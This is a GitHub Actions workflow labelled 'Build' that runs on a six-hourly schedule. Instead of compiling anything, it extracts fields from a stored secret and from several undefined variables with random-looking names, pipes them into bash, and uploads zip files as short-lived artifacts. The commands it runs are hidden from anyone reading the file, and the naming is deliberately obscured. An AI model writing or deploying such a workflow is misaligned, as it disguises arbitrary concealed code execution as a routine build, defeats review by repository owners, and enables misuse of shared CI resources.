name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '55 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          gcbqn33: ${{ secrets.gcbqn33 }}
        run: |
          printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
          printf '%s' "$tjm17" | jq -r .o352 | /bin/bash
          echo $r082 | jq -r .rxyn09 | /bin/bash
          printf '%s' "$kzebs701" | jq -r .f23048 | /bin/bash
          echo $cooss8100 | jq -r .abyw94780 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mAVisCf8
          path: "*.zip"
          retention-days: 1
